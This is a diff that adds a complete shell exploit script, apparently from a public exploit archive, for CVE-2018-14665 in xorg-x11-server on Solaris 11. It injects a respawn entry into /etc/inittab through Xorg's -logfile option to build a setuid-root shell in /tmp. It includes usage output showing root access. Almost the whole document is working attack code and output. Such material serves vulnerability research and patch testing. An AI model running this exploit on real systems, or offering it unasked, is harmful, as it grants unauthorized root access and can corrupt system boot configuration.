@@ -1,0 +1,78 @@
+#!/bin/sh
+
+# Exploit Title: xorg-x11-server < 1.20.3 - Local Privilege Escalation (Solaris11 inittab)
+# Date: 2018-11-25
+# Exploit Author: Marco Ivaldi
+# Vendor Homepage: https://www.x.org/
+# Version: xorg-x11-server 1.19.0 - 1.20.2
+# Tested on: Oracle Solaris 11.4
+# CVE : CVE-2018-14665
+
+#
+# raptor_solgasm - xorg-x11-server LPE via Solaris inittab
+# Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>
+#
+# A flaw was found in xorg-x11-server before 1.20.3. An incorrect permission 
+# check for -modulepath and -logfile options when starting Xorg. X server 
+# allows unprivileged users with the ability to log in to the system via 
+# physical console to escalate their privileges and run arbitrary code under 
+# root privileges (CVE-2018-14665).
+#
+# "In video games, this is what they call respawning" -- Nick Sax
+#
+# This exploit targets /etc/inittab in order to escalate privileges to root
+# on Solaris 11 (no need to be connected to a physical console). Messing with 
+# inittab is considerably dangerous and you may trash your system, however the
+# other potential vectors (cron, passwd, sudo, ld.config, etc.) either don't 
+# work or are even worse. Still, DON'T RUN UNLESS YOU KNOW WHAT YOU ARE DOING!
+#
+# See also:
+# https://github.com/0xdea/exploits/blob/master/openbsd/raptor_xorgasm
+#
+# Usage:
+# raptor@stalker:~$ chmod +x raptor_solgasm
+# raptor@stalker:~$ ./raptor_solgasm
+# [...]
+# Now please be patient for a few minutes...
+# [...]
+# To avoid trashing the system, remember to: mv /etc/inittab.old /etc/inittab
+# -rw-r--r--   1 root     staff      13870 nov 24 22:01 /etc/inittab
+# -rw-r--r--   1 root     sys          967 nov 24 20:01 /etc/inittab.old
+# -rwsrwxrwx   1 root     root     1249080 nov 24 22:05 /tmp/pwned
+# root@stalker:/etc# id
+# uid=0(root) gid=0(root)
+#
+# Vulnerable platforms (setuid Xorg 1.19.0 - 1.20.2):
+# Oracle Solaris 11 X86 [tested on 11.4.0.0.1.15.0 with Xorg 1.19.5]
+# Oracle Solaris 11 SPARC [untested]
+#
+
+echo "raptor_solgasm - xorg-x11-server LPE via Solaris inittab"
+echo "Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>"
+
+# prepare the payload
+cat << EOF > /tmp/solgasm
+cp /bin/zsh /tmp/pwned # fallback in case gcc is not available
+echo "main(){setuid(0);setgid(0);system(\"/bin/bash\");}" > /tmp/pwned.c
+gcc /tmp/pwned.c -o /tmp/pwned
+chmod 4777 /tmp/pwned
+EOF
+chmod +x /tmp/solgasm
+
+# trigger the bug
+PWN=x$(cat /dev/urandom | env LC_CTYPE=C tr -dc '[:lower:]' | fold -3 | head -1)
+cd /etc
+Xorg -fp "${PWN}::respawn:/tmp/solgasm" -logfile inittab :1 &
+sleep 5
+pkill Xorg
+
+# run the setuid shell
+echo
+echo "Now please be patient for a few minutes..."
+echo
+until [ -u /tmp/pwned ]; do sleep 1; done
+echo "To avoid trashing the system remember to mv /etc/inittab.old /etc/inittab"
+ls -l /etc/inittab*
+ls -l /tmp/pwned
+sleep 1
+/tmp/pwned
